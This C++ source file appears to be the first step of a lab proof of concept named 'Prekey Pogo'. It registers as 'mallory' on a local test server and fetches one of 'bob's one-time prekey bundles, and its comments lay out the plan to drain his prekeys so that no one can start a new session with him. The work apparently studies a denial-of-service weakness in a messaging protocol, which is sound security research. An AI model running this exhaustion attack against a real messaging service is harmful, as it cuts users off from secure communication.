// attack1.cpp — Prekey Pogo (one-time-prekey exhaustion)
//
// Role: Mallory, an ORDINARY client (no special network position). Bob has
// published a prekey bundle and gone offline. Each fetch_bundle for Bob hands
// out — and consumes — one of his one-time prekeys (OPKs); the response's
// `count` reports how many remain. If fetching is unauthenticated and not
// rate-limited, Mallory can drain Bob's OPK inventory so that no new session
// can be started with Bob until he republishes.
//
// STAGE: Step 1 — connect, register, single fetch_bundle, print the response.
// This proves connectivity and that we can read `count` (OPKs remaining) and the
// handed-out `opk_id`. The draining loop is Step 2.
//
// Build:  make
// Run:    ./attack1               (defaults: server 127.0.0.1:9000, target bob)
//         ./attack1 --target bob --user mallory
//         see README.md for the full scenario setup

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cctype>
#include <cerrno>
#include <string>

#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// ---------------------------------------------------------------------------
// Config — adjust to the lab environment.
// ---------------------------------------------------------------------------
namespace cfg {
    const char* SERVER_ADDR = "127.0.0.1";  // real server (host-published port)
    const int   SERVER_PORT = 9000;
}

static std::string g_target   = "bob";      // whose OPKs we drain
static std::string g_user     = "mallory";  // username Mallory registers as
static bool        g_register = true;       // --no-register to skip register
static std::string g_server   = cfg::SERVER_ADDR;
static int         g_port     = cfg::SERVER_PORT;

// ---------------------------------------------------------------------------
// Tiny JSON field readers (good enough for the lab's one-line frames).
// ---------------------------------------------------------------------------
static std::string json_str_field(const std::string& line, const std::string& key) {
    std::string pat = "\"" + key + "\":\"";
    size_t p = line.find(pat);
    if (p == std::string::npos) return "";
    p += pat.size();
    size_t q = line.find('"', p);
    if (q == std::string::npos) return "";
    return line.substr(p, q - p);
}

// Read the integer value of a top-level "key":<int> pair; `def` if absent.
static long json_int_field(const std::string& line, const std::string& key, long def = -1) {
    std::string pat = "\"" + key + "\":";
    size_t p = line.find(pat);
    if (p == std::string::npos) return def;
    size_t b = p + pat.size();
    while (b < line.size() && line[b] == ' ') ++b;
    size_t e = b;
    if (e < line.size() && line[e] == '-') ++e;
    size_t d0 = e;
    while (e < line.size() && std::isdigit((unsigned char)line[e])) ++e;
    if (e == d0) return def;
    return std::strtol(line.c_str() + b, nullptr, 10);
}

// ---------------------------------------------------------------------------
// A line-oriented connection to the server.
// ---------------------------------------------------------------------------
struct Conn {
    int         fd = -1;
    std::string buf;   // leftover bytes not yet split into a line
};

// Dial the server (addr may be a hostname or an IP).
static int dial_server(const std::string& addr, int port) {
    char ports[8];
    std::snprintf(ports, sizeof(ports), "%d", port);

    addrinfo hints{};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    addrinfo* res = nullptr;
    if (getaddrinfo(addr.c_str(), ports, &hints, &res) != 0) {
        std::fprintf(stderr, "[attack1] cannot resolve %s\n", addr.c_str());
        return -1;
    }
    int fd = -1;
    for (addrinfo* p = res; p; p = p->ai_next) {
        fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, p->ai_addr, p->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    if (fd < 0) std::fprintf(stderr, "[attack1] cannot connect to %s:%d\n", addr.c_str(), port);
    return fd;
}

// Write one newline-terminated request (handles short writes).
static bool conn_writeline(Conn& c, const std::string& s) {
    std::string out = s;
    out.push_back('\n');
    size_t off = 0;
    while (off < out.size()) {
        ssize_t w = send(c.fd, out.data() + off, out.size() - off, 0);
        if (w <= 0) return false;
        off += (size_t)w;
    }
    return true;
}

// Read one newline-terminated response line (without the newline).
static bool conn_readline(Conn& c, std::string& line) {
    for (;;) {
        size_t nl = c.buf.find('\n');
        if (nl != std::string::npos) {
            line = c.buf.substr(0, nl);
            c.buf.erase(0, nl + 1);
            return true;
        }
        char data[4096];
        ssize_t n = recv(c.fd, data, sizeof(data), 0);
        if (n <= 0) return false;
        c.buf.append(data, n);
    }
}

// ---------------------------------------------------------------------------
// One fetch_bundle round-trip. Prints the handed-out opk_id and remaining
// count; returns the `count` field, or -1 on error / parse failure.
// (Step 2 will call this in a loop to drain the inventory.)
// ---------------------------------------------------------------------------
static long do_fetch(Conn& c, const std::string& target, int idx) {
    std::string req = "{\"type\":\"fetch_bundle\",\"user\":\"" + target + "\"}";
    if (!conn_writeline(c, req)) {
        std::fprintf(stderr, "[attack1] fetch #%d: send failed\n", idx);
        return -1;
    }
    std::string resp;
    if (!conn_readline(c, resp)) {
        std::fprintf(stderr, "[attack1] fetch #%d: no response\n", idx);
        return -1;
    }

    std::string type = json_str_field(resp, "type");
    if (type == "err") {
        std::printf("[attack1] fetch #%d -> err: %s\n",
                    idx, json_str_field(resp, "err").c_str());
        return -1;
    }
    long count  = json_int_field(resp, "count", -1);
    long opk_id = json_int_field(resp, "opk_id", -1);  // inside the bundle object
    std::printf("[attack1] fetch #%d -> opk_id=%ld, OPKs remaining=%ld\n",
                idx, opk_id, count);
    return count;
}

int main(int argc, char** argv) {
    for (int i = 1; i < argc; ++i) {
        if (std::strcmp(argv[i], "--target") == 0 && i + 1 < argc)
            g_target = argv[++i];
        else if (std::strcmp(argv[i], "--user") == 0 && i + 1 < argc)
            g_user = argv[++i];
        else if (std::strcmp(argv[i], "--no-register") == 0)
            g_register = false;
        else if (std::strcmp(argv[i], "--server") == 0 && i + 1 < argc)
            g_server = argv[++i];
        else if (std::strcmp(argv[i], "--port") == 0 && i + 1 < argc)
            g_port = std::atoi(argv[++i]);
    }

    std::printf("[attack1] Prekey Pogo (Step 1: single fetch)\n");
    std::printf("[attack1] server %s:%d  target '%s'  as '%s'\n",
                g_server.c_str(), g_port, g_target.c_str(),
                g_register ? g_user.c_str() : "(unregistered)");

    Conn c;
    c.fd = dial_server(g_server, g_port);
    if (c.fd < 0) return 1;

    if (g_register) {
        std::string reg = "{\"type\":\"register\",\"user\":\"" + g_user + "\"}";
        std::string resp;
        if (!conn_writeline(c, reg) || !conn_readline(c, resp)) {
            std::fprintf(stderr, "[attack1] register failed\n");
            close(c.fd);
            return 1;
        }
        std::printf("[attack1] register '%s' -> %s\n", g_user.c_str(), resp.c_str());
    }

    // Step 1: a single fetch. Step 2 wraps this in a loop (--count / until drained).
    do_fetch(c, g_target, 1);

    close(c.fd);
    std::printf("[attack1] done.\n");
    return 0;
}
